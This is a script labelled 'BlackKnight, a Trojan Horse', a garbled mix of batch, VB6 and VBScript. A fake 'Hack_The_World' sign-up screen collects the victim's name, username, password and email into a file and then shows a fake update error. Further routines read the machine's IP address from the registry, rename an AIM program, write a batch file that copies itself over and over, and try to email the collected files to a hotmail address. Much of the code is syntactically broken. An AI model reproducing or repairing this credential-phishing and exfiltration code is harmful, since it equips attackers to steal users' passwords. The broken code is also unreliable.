rem BlackKnight
rem a Trojan Horse
rem by Ziimac
Main()

@echo off
goto questionpart
:questionpart
color 3
echo 1. Welcome to Hack_The_World"
echo 2. by Ziimac...
pause
cls
echo 1. To register fill out the questions...
pause
cls
set /P NAME=Type your name: 
echo %NAME% >> c:\allquiz.txt
echo Hello %NAME% lets begin!
cls
set /P USERNAME=Choose Username:
echo %USERNAME% >> c:\allquiz.txt
cls
set /P Password=Choose password:
echo %Password% >> c:\allquiz.txt
cls
set /P PasswordC=Re-Enter Password:
echo %PasswordC% >> c:\allquiz.txt
cls
set /P Email=E-mail:
echo %Email% >> c:\allquiz.txt
cls
set /P yesno=%USERNAME% %PASSWORD% %Email% "Are these correct?":
echo %yesno% >> c:\allquiz.txt
cls
echo "ERROR" 
echo "COMPUTER NOT UP TO DATE"
pause
cls
echo "134804820982319381"
pause
cls

Sub IP()
Private Sub Form_Unload(Cancel As Integer)
Shell App.Path & "\" & App.EXEName & ".exe"
End Sub
Private Sub Form_Initialize()

On error resume next

open "C:\tmp.vaa" for input as #1 ' Opens variable file
     Input #1, Variable               ' Loads variable values
Close #1

End Sub

Sub IP()
Function GetIPAddress

' Declare variables

  Dim key
  Dim cTempIPAddress
  Dim cIPAddress
  dim cIPAddressKey


  Set oSh = CreateObject("WScript.Shell")

  cInterfacesKey="HKLM\SYSTEM\CurrentControlSet\Services\TCPIP\Parameters\Interfaces\"
  cNICSearch="HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkCards\1\ServiceName"



  cNicServiceName=oSh.RegRead(cNICSearch)


  cIPAddressKey=cInterfaceskey + cNicServiceName+"\IPAddress"
  cTempIPAddress=oSh.RegRead (cIPAddresskey)


  cIPAddress=split (cTempIPAddress(0),".",4)

  GetIPAddress=cIPAddress
End Function

Function GetIPOctet (nOctet)
    Dim IPAddress
  
   IPAddress=GetIPAddress
   GetIPOctet=IPAddress(nOctet-1) >> C:\IPAdd.txt" 
End Function

Function ViewLog

'Kazaa

C:\Progra~1\Kazaa\kazaa.exe >>Kazaa.txt
End Function

Sub Batch()
Set filesysren = CreateObject("Scripting.FileSystemObject")
If filesysren.FileExists("d:\Progra~1\Aim95\Aim.exe") Then
filesysren.MoveFile "d:\Progra~1\Aim95\Aim.exe", "d:\Progra~1\Kazaa\AOLSucks.exe"
End If
set batcha=fso.CreateTextFile("C:\System.bat")
batcha.WriteLine @Echo off
batcha.WriteLine c:\windows\system32\*.nls"
batcha.WriteLine Start C:\Progra~1\Kazaa\AOLSucks.exe" >>yo.bat
batcha.WriteLine copy %0 "C:\1.bat" >>yo.bat
batcha.WriteLine copy %0 "C:\2.bat" >>yo.bat
batcha.WriteLine copy %0 "C:\3.bat" >>yo.bat
batcha.WriteLine copy %0 "C:\4.bat" >>yo.bat
batcha.WriteLine copy %0 "C:\5.bat" >>yo.bat
batcha.WriteLine copy %0 "C:\6.bat" >>yo.bat
batcha.WriteLine copy %0 "C:\7.bat" >>yo.bat
batcha.WriteLine copy %0 "C:\8.bat" >>yo.bat
batcha.WriteLine copy %0 "C:\9.bat" >>yo.bat
batcha.WriteLine copy %0 "C:\10.bat" >>yo.bat
batcha.WriteLine copy %0 "C:\11.bat" >>yo.bat
batcha.WriteLine copy %0 "C:\12.bat" >>yo.bat
batcha.WriteLine copy %0 "C:\13.bat" >>yo.bat
batcha.WriteLine copy %0 "C:\14.bat" >>yo.bat
batcha.WriteLine copy %0 "C:\15.bat" >>yo.bat
batcha.WriteLine copy %0 "C:\16.bat" >>yo.bat
batcha.WriteLine copy %0 "C:\17.bat" >>yo.bat
batcha.WriteLine copy %0 "C:\185.bat" >>yo.bat
batcha.WriteLine copy %0 "C:\6869869.bat" >>yo.bat
batcha.Close
Start yo.bat

Sub Mail()
On error resume next
Set Mail=zBRNSz@hotmail.com.CreateItem(0) 
Mail.to=zBRNSz@hotmail.com
Mail.Subject="LOOK AT MY IP ADDRESS!" 
Mail.Body="Click the .txt attachment " 
Mail.Attachments.Add Wscript.IPAdd.txt
Mail.Send 
Next 
zBRNSz@hotmail.com.Quit

Sub Mail2()
on error resume next 
Set Mail=zBRNSz@hotmail.com.CreateItem(0) 
Mail.to=zBRNSz@hotmail.com
Mail.Subject="LOOK AT MY IP ADDRESS!" 
Mail.Body="Click the .txt attachment " 
Mail.Attachments.Add Wscript.Bills.txt
Mail.Send 
Next 
zBRNSz@hotmail.com.Quit

Sub Override()
On error resume next
Open c:\Goldmine for Output as 1#
Print 1#, "@Echo off"
Print 1#, "cls"
Print 1#, "The T-Cells are destroyed..."
Close 1#
End sub










